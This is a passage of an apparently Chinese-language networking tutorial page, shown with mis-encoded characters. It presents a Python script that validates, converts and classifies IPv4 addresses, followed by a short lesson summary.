class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># day08_ip_analyzer.py</span><br><span class="hljs-comment"># åŠŸèƒ½ï¼šIPåœ°å€åˆ†æå·¥å…·</span><br><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">IPAnalyzer</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;IPåœ°å€åˆ†æå™¨&quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment"># ç§ç½‘IPåœ°å€èŒƒå›´</span><br>        <span class="hljs-variable language_">self</span>.private_ranges = [<br>            (<span class="hljs-string">&#x27;10.0.0.0&#x27;</span>, <span class="hljs-string">&#x27;10.255.255.255&#x27;</span>),<br>            (<span class="hljs-string">&#x27;172.16.0.0&#x27;</span>, <span class="hljs-string">&#x27;172.31.255.255&#x27;</span>),<br>            (<span class="hljs-string">&#x27;192.168.0.0&#x27;</span>, <span class="hljs-string">&#x27;192.168.255.255&#x27;</span>)<br>        ]<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">ip_to_int</span>(<span class="hljs-params">self, ip</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        å°†IPåœ°å€è½¬æ¢ä¸ºæ•´æ•°</span><br><span class="hljs-string"></span><br><span class="hljs-string">        å‚æ•°ï¼š</span><br><span class="hljs-string">            ip: IPåœ°å€å­—ç¬¦ä¸²ï¼ˆå¦‚ &quot;192.168.1.1&quot;ï¼‰</span><br><span class="hljs-string"></span><br><span class="hljs-string">        è¿”å›ï¼š</span><br><span class="hljs-string">            æ•´æ•°å½¢å¼çš„IP</span><br><span class="hljs-string"></span><br><span class="hljs-string">        å·¥ä½œåŸç†ï¼š</span><br><span class="hljs-string">            192.168.1.1 = 192*256^3 + 168*256^2 + 1*256 + 1</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        parts = ip.split(<span class="hljs-string">&#x27;.&#x27;</span>)<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">int</span>(parts[<span class="hljs-number">0</span>]) &lt;&lt; <span class="hljs-number">24</span>) + (<span class="hljs-built_in">int</span>(parts[<span class="hljs-number">1</span>]) &lt;&lt; <span class="hljs-number">16</span>) + \<br>               (<span class="hljs-built_in">int</span>(parts[<span class="hljs-number">2</span>]) &lt;&lt; <span class="hljs-number">8</span>) + <span class="hljs-built_in">int</span>(parts[<span class="hljs-number">3</span>])<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">int_to_ip</span>(<span class="hljs-params">self, num</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        å°†æ•´æ•°è½¬æ¢ä¸ºIPåœ°å€</span><br><span class="hljs-string"></span><br><span class="hljs-string">        å‚æ•°ï¼š</span><br><span class="hljs-string">            num: æ•´æ•°å½¢å¼çš„IP</span><br><span class="hljs-string"></span><br><span class="hljs-string">        è¿”å›ï¼š</span><br><span class="hljs-string">            IPåœ°å€å­—ç¬¦ä¸²</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;(num &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">255</span>&#125;</span>.<span class="hljs-subst">&#123;(num &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">255</span>&#125;</span>.&quot;</span> \<br>               <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;(num &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">255</span>&#125;</span>.<span class="hljs-subst">&#123;num &amp; <span class="hljs-number">255</span>&#125;</span>&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">ip_to_binary</span>(<span class="hljs-params">self, ip</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        å°†IPåœ°å€è½¬æ¢ä¸ºäºŒè¿›åˆ¶è¡¨ç¤º</span><br><span class="hljs-string"></span><br><span class="hljs-string">        å‚æ•°ï¼š</span><br><span class="hljs-string">            ip: IPåœ°å€å­—ç¬¦ä¸²</span><br><span class="hljs-string"></span><br><span class="hljs-string">        è¿”å›ï¼š</span><br><span class="hljs-string">            äºŒè¿›åˆ¶å­—ç¬¦ä¸²ï¼ˆç”¨ç‚¹åˆ†éš”ï¼‰</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        parts = ip.split(<span class="hljs-string">&#x27;.&#x27;</span>)<br>        binary_parts = [<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(part), <span class="hljs-string">&#x27;08b&#x27;</span>) <span class="hljs-keyword">for</span> part <span class="hljs-keyword">in</span> parts]<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;.&#x27;</span>.join(binary_parts)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">validate_ip</span>(<span class="hljs-params">self, ip</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        éªŒè¯IPåœ°å€æ ¼å¼æ˜¯å¦æ­£ç¡®</span><br><span class="hljs-string"></span><br><span class="hljs-string">        å‚æ•°ï¼š</span><br><span class="hljs-string">            ip: IPåœ°å€å­—ç¬¦ä¸²</span><br><span class="hljs-string"></span><br><span class="hljs-string">        è¿”å›ï¼š</span><br><span class="hljs-string">            True/False</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        pattern = <span class="hljs-string">r&#x27;^(\d&#123;1,3&#125;)\.(\d&#123;1,3&#125;)\.(\d&#123;1,3&#125;)\.(\d&#123;1,3&#125;)$&#x27;</span><br>        <span class="hljs-keyword">match</span> = re.<span class="hljs-keyword">match</span>(pattern, ip)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">match</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>        <span class="hljs-comment"># æ£€æŸ¥æ¯ä¸ªæ•°å­—æ˜¯å¦åœ¨0-255èŒƒå›´å†…</span><br>        <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> <span class="hljs-keyword">match</span>.groups():<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(num) &gt; <span class="hljs-number">255</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_ip_class</span>(<span class="hljs-params">self, ip</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        åˆ¤æ–­IPåœ°å€çš„ç±»åˆ«ï¼ˆA/B/C/D/Eç±»ï¼‰</span><br><span class="hljs-string"></span><br><span class="hljs-string">        å‚æ•°ï¼š</span><br><span class="hljs-string">            ip: IPåœ°å€å­—ç¬¦ä¸²</span><br><span class="hljs-string"></span><br><span class="hljs-string">        è¿”å›ï¼š</span><br><span class="hljs-string">            ç±»åˆ«å­—ç¬¦ä¸²å’Œè¯¦ç»†ä¿¡æ¯</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        first_octet = <span class="hljs-built_in">int</span>(ip.split(<span class="hljs-string">&#x27;.&#x27;</span>)[<span class="hljs-number">0</span>])<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-number">1</span> &lt;= first_octet &lt;= <span class="hljs-number">126</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-string">&#x27;å¤§å‹ç½‘ç»œ&#x27;</span>, <span class="hljs-string">&#x27;1-126&#x27;</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-number">128</span> &lt;= first_octet &lt;= <span class="hljs-number">191</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-string">&#x27;ä¸­å‹ç½‘ç»œ&#x27;</span>, <span class="hljs-string">&#x27;128-191&#x27;</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-number">192</span> &lt;= first_octet &lt;= <span class="hljs-number">223</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-string">&#x27;å°å‹ç½‘ç»œ&#x27;</span>, <span class="hljs-string">&#x27;192-223&#x27;</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-number">224</span> &lt;= first_octet &lt;= <span class="hljs-number">239</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;D&#x27;</span>, <span class="hljs-string">&#x27;ç»„æ’­åœ°å€&#x27;</span>, <span class="hljs-string">&#x27;224-239&#x27;</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-number">240</span> &lt;= first_octet &lt;= <span class="hljs-number">255</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-string">&#x27;ä¿ç•™åœ°å€&#x27;</span>, <span class="hljs-string">&#x27;240-255&#x27;</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;æœªçŸ¥&#x27;</span>, <span class="hljs-string">&#x27;ç‰¹æ®Šåœ°å€&#x27;</span>, <span class="hljs-string">&#x27;0æˆ–127&#x27;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">is_private_ip</span>(<span class="hljs-params">self, ip</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        åˆ¤æ–­æ˜¯å¦ä¸ºç§ç½‘IP</span><br><span class="hljs-string"></span><br><span class="hljs-string">        å‚æ•°ï¼š</span><br><span class="hljs-string">            ip: IPåœ°å€å­—ç¬¦ä¸²</span><br><span class="hljs-string"></span><br><span class="hljs-string">        è¿”å›ï¼š</span><br><span class="hljs-string">            True/False</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        ip_int = <span class="hljs-variable language_">self</span>.ip_to_int(ip)<br><br>        <span class="hljs-keyword">for</span> start, end <span class="hljs-keyword">in</span> <span class="hljs-variable language_">self</span>.private_ranges:<br>            start_int = <span class="hljs-variable language_">self</span>.ip_to_int(start)<br>            end_int = <span class="hljs-variable language_">self</span>.ip_to_int(end)<br><br>            <span class="hljs-keyword">if</span> start_int &lt;= ip_int &lt;= end_int:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">is_special_ip</span>(<span class="hljs-params">self, ip</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        åˆ¤æ–­æ˜¯å¦ä¸ºç‰¹æ®ŠIPåœ°å€</span><br><span class="hljs-string"></span><br><span class="hljs-string">        å‚æ•°ï¼š</span><br><span class="hljs-string">            ip: IPåœ°å€å­—ç¬¦ä¸²</span><br><span class="hljs-string"></span><br><span class="hljs-string">        è¿”å›ï¼š</span><br><span class="hljs-string">            (æ˜¯å¦ç‰¹æ®Š, ç±»å‹è¯´æ˜)</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-comment"># ç¯å›åœ°å€</span><br>        <span class="hljs-keyword">if</span> ip.startswith(<span class="hljs-string">&#x27;127.&#x27;</span>):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>, <span class="hljs-string">&#x27;ç¯å›åœ°å€ï¼ˆLoopbackï¼‰&#x27;</span><br><br>        <span class="hljs-comment"># é»˜è®¤è·¯ç”±</span><br>        <span class="hljs-keyword">if</span> ip == <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>, <span class="hljs-string">&#x27;é»˜è®¤è·¯ç”±/ä»»æ„åœ°å€&#x27;</span><br><br>        <span class="hljs-comment"># å—é™å¹¿æ’­</span><br>        <span class="hljs-keyword">if</span> ip == <span class="hljs-string">&#x27;255.255.255.255&#x27;</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>, <span class="hljs-string">&#x27;å—é™å¹¿æ’­åœ°å€&#x27;</span><br><br>        <span class="hljs-comment"># ç½‘ç»œåœ°å€ï¼ˆä¸»æœºå·å…¨0ï¼‰</span><br>        <span class="hljs-keyword">if</span> ip.endswith(<span class="hljs-string">&#x27;.0&#x27;</span>):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>, <span class="hljs-string">&#x27;ç½‘ç»œåœ°å€&#x27;</span><br><br>        <span class="hljs-comment"># å¹¿æ’­åœ°å€ï¼ˆä¸»æœºå·å…¨255ï¼‰</span><br>        <span class="hljs-keyword">if</span> ip.endswith(<span class="hljs-string">&#x27;.255&#x27;</span>):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>, <span class="hljs-string">&#x27;å¹¿æ’­åœ°å€&#x27;</span><br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>, <span class="hljs-string">&#x27;&#x27;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">analyze</span>(<span class="hljs-params">self, ip</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        å…¨é¢åˆ†æIPåœ°å€</span><br><span class="hljs-string"></span><br><span class="hljs-string">        å‚æ•°ï¼š</span><br><span class="hljs-string">            ip: IPåœ°å€å­—ç¬¦ä¸²</span><br><span class="hljs-string"></span><br><span class="hljs-string">        è¿”å›ï¼š</span><br><span class="hljs-string">            åˆ†æç»“æœå­—å…¸</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-variable language_">self</span>.validate_ip(ip):<br>            <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&#x27;valid&#x27;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">&#x27;IPåœ°å€æ ¼å¼ä¸æ­£ç¡®&#x27;</span>&#125;<br><br>        result = &#123;<br>            <span class="hljs-string">&#x27;valid&#x27;</span>: <span class="hljs-literal">True</span>,<br>            <span class="hljs-string">&#x27;ip&#x27;</span>: ip,<br>            <span class="hljs-string">&#x27;binary&#x27;</span>: <span class="hljs-variable language_">self</span>.ip_to_binary(ip),<br>            <span class="hljs-string">&#x27;integer&#x27;</span>: <span class="hljs-variable language_">self</span>.ip_to_int(ip),<br>            <span class="hljs-string">&#x27;class&#x27;</span>: <span class="hljs-variable language_">self</span>.get_ip_class(ip),<br>            <span class="hljs-string">&#x27;is_private&#x27;</span>: <span class="hljs-variable language_">self</span>.is_private_ip(ip),<br>            <span class="hljs-string">&#x27;is_public&#x27;</span>: <span class="hljs-keyword">not</span> <span class="hljs-variable language_">self</span>.is_private_ip(ip) <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> <span class="hljs-variable language_">self</span>.is_special_ip(ip)[<span class="hljs-number">0</span>],<br>            <span class="hljs-string">&#x27;special&#x27;</span>: <span class="hljs-variable language_">self</span>.is_special_ip(ip)<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> result<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">print_analysis</span>(<span class="hljs-params">self, ip</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        æ‰“å°IPåœ°å€åˆ†æç»“æœ</span><br><span class="hljs-string"></span><br><span class="hljs-string">        å‚æ•°ï¼š</span><br><span class="hljs-string">            ip: IPåœ°å€å­—ç¬¦ä¸²</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;IPåœ°å€åˆ†æç»“æœ&quot;</span>.center(<span class="hljs-number">70</span>))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br><br>        result = <span class="hljs-variable language_">self</span>.analyze(ip)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> result[<span class="hljs-string">&#x27;valid&#x27;</span>]:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\nâŒ <span class="hljs-subst">&#123;result[<span class="hljs-string">&#x27;error&#x27;</span>]&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">return</span><br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\nğŸ“ IPåœ°å€: <span class="hljs-subst">&#123;result[<span class="hljs-string">&#x27;ip&#x27;</span>]&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ğŸ”¢ åè¿›åˆ¶: <span class="hljs-subst">&#123;result[<span class="hljs-string">&#x27;integer&#x27;</span>]&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ğŸ’¾ äºŒè¿›åˆ¶: <span class="hljs-subst">&#123;result[<span class="hljs-string">&#x27;binary&#x27;</span>]&#125;</span>&quot;</span>)<br><br>        ip_class, usage, range_str = result[<span class="hljs-string">&#x27;class&#x27;</span>]<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\nğŸ“Š åœ°å€ç±»åˆ«: <span class="hljs-subst">&#123;ip_class&#125;</span>ç±»&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   ç”¨é€”: <span class="hljs-subst">&#123;usage&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   èŒƒå›´: <span class="hljs-subst">&#123;range_str&#125;</span>&quot;</span>)<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\nğŸŒ åœ°å€ç±»å‹:&quot;</span>)<br>        <span class="hljs-keyword">if</span> result[<span class="hljs-string">&#x27;special&#x27;</span>][<span class="hljs-number">0</span>]:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   â­ <span class="hljs-subst">&#123;result[<span class="hljs-string">&#x27;special&#x27;</span>][<span class="hljs-number">1</span>]&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">elif</span> result[<span class="hljs-string">&#x27;is_private&#x27;</span>]:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   ğŸ  ç§ç½‘IPï¼ˆä¸èƒ½åœ¨äº’è”ç½‘ä¸Šç›´æ¥è®¿é—®ï¼‰&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   ğŸŒ å…¬ç½‘IPï¼ˆå¯ä»¥åœ¨äº’è”ç½‘ä¸Šç›´æ¥è®¿é—®ï¼‰&quot;</span>)<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span> + <span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_local_ips</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    è·å–æœ¬æœºæ‰€æœ‰IPåœ°å€</span><br><span class="hljs-string"></span><br><span class="hljs-string">    è¿”å›ï¼š</span><br><span class="hljs-string">        IPåœ°å€åˆ—è¡¨</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># è·å–ä¸»æœºå</span><br>        hostname = socket.gethostname()<br><br>        <span class="hljs-comment"># è·å–æ‰€æœ‰IP</span><br>        ips = socket.gethostbyname_ex(hostname)[<span class="hljs-number">2</span>]<br><br>        <span class="hljs-keyword">return</span> ips<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> []<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    ä¸»å‡½æ•°</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    analyzer = IPAnalyzer()<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;IPåœ°å€åˆ†æå·¥å…·&quot;</span>.center(<span class="hljs-number">70</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br><br>    <span class="hljs-comment"># æ˜¾ç¤ºæœ¬æœºIP</span><br>    local_ips = get_local_ips()<br>    <span class="hljs-keyword">if</span> local_ips:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\nğŸ’» æœ¬æœºIPåœ°å€:&quot;</span>)<br>        <span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> local_ips:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   <span class="hljs-subst">&#123;ip&#125;</span>&quot;</span>)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span> + <span class="hljs-string">&quot;-&quot;</span> * <span class="hljs-number">70</span>)<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\nè¯·é€‰æ‹©æ“ä½œ:&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;1. åˆ†æIPåœ°å€&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;2. IPåœ°å€è½¬æ¢ï¼ˆåè¿›åˆ¶ â†” äºŒè¿›åˆ¶ï¼‰&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;3. æ‰¹é‡åˆ†æ&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;0. é€€å‡º&quot;</span>)<br><br>        choice = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\nè¯·è¾“å…¥é€‰é¡¹: &quot;</span>).strip()<br><br>        <span class="hljs-keyword">if</span> choice == <span class="hljs-string">&#x27;0&#x27;</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\nå†è§ï¼&quot;</span>)<br>            <span class="hljs-keyword">break</span><br><br>        <span class="hljs-keyword">elif</span> choice == <span class="hljs-string">&#x27;1&#x27;</span>:<br>            ip = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\nè¯·è¾“å…¥IPåœ°å€: &quot;</span>).strip()<br>            <span class="hljs-keyword">if</span> ip:<br>                analyzer.print_analysis(ip)<br><br>        <span class="hljs-keyword">elif</span> choice == <span class="hljs-string">&#x27;2&#x27;</span>:<br>            ip = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\nè¯·è¾“å…¥IPåœ°å€: &quot;</span>).strip()<br>            <span class="hljs-keyword">if</span> ip <span class="hljs-keyword">and</span> analyzer.validate_ip(ip):<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\nåè¿›åˆ¶: <span class="hljs-subst">&#123;ip&#125;</span>&quot;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;äºŒè¿›åˆ¶: <span class="hljs-subst">&#123;analyzer.ip_to_binary(ip)&#125;</span>&quot;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;æ•´æ•°: <span class="hljs-subst">&#123;analyzer.ip_to_int(ip)&#125;</span>&quot;</span>)<br><br>        <span class="hljs-keyword">elif</span> choice == <span class="hljs-string">&#x27;3&#x27;</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\nè¯·è¾“å…¥å¤šä¸ªIPåœ°å€ï¼ˆæ¯è¡Œä¸€ä¸ªï¼Œè¾“å…¥ç©ºè¡Œç»“æŸï¼‰:&quot;</span>)<br>            ips = []<br>            <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                ip = <span class="hljs-built_in">input</span>().strip()<br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ip:<br>                    <span class="hljs-keyword">break</span><br>                ips.append(ip)<br><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n<span class="hljs-subst">&#123;<span class="hljs-string">&#x27;IPåœ°å€&#x27;</span>:&lt;<span class="hljs-number">18</span>&#125;</span> <span class="hljs-subst">&#123;<span class="hljs-string">&#x27;ç±»åˆ«&#x27;</span>:&lt;<span class="hljs-number">8</span>&#125;</span> <span class="hljs-subst">&#123;<span class="hljs-string">&#x27;ç±»å‹&#x27;</span>:&lt;<span class="hljs-number">15</span>&#125;</span>&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;-&quot;</span> * <span class="hljs-number">45</span>)<br><br>            <span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> ips:<br>                result = analyzer.analyze(ip)<br>                <span class="hljs-keyword">if</span> result[<span class="hljs-string">&#x27;valid&#x27;</span>]:<br>                    ip_class = result[<span class="hljs-string">&#x27;class&#x27;</span>][<span class="hljs-number">0</span>]<br>                    <span class="hljs-keyword">if</span> result[<span class="hljs-string">&#x27;special&#x27;</span>][<span class="hljs-number">0</span>]:<br>                        ip_type = result[<span class="hljs-string">&#x27;special&#x27;</span>][<span class="hljs-number">1</span>][:<span class="hljs-number">12</span>]<br>                    <span class="hljs-keyword">elif</span> result[<span class="hljs-string">&#x27;is_private&#x27;</span>]:<br>                        ip_type = <span class="hljs-string">&#x27;ç§ç½‘&#x27;</span><br>                    <span class="hljs-keyword">else</span>:<br>                        ip_type = <span class="hljs-string">&#x27;å…¬ç½‘&#x27;</span><br><br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;ip:&lt;<span class="hljs-number">18</span>&#125;</span> <span class="hljs-subst">&#123;ip_class:&lt;<span class="hljs-number">8</span>&#125;</span> <span class="hljs-subst">&#123;ip_type:&lt;<span class="hljs-number">15</span>&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><h3 id="è¿è¡Œç¨‹åº">è¿è¡Œç¨‹åº</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python code/day08/day08_ip_analyzer.py<br></code></pre></td></tr></table></figure><h2 id="ğŸ“-çŸ¥è¯†å°ç»“">ğŸ“ çŸ¥è¯†å°ç»“</h2><p>ä»Šå¤©æˆ‘ä»¬å­¦ä¹ äº†ï¼š</p><ol><li>âœ… IPåœ°å€æ˜¯32ä½äºŒè¿›åˆ¶æ•°ï¼ˆIPv4ï¼‰</li><li>âœ… IPåœ°å€åˆ†ä¸º5ç±»ï¼šA/B/C/D/E</li><li>âœ… ç§ç½‘IPä¸èƒ½åœ¨äº’è”ç½‘ä¸Šç›´æ¥ä½¿ç”¨</li><li>âœ… ç‰¹æ®ŠIPåœ°å€æœ‰ç‰¹å®šç”¨é€”</li><li>âœ… èƒ½å¤Ÿåˆ†æå’Œè½¬æ¢IPåœ°å€</li></ol><h2 id="ğŸ’ª-ç»ƒä¹ é¢˜">ğŸ’ª ç»ƒä¹ 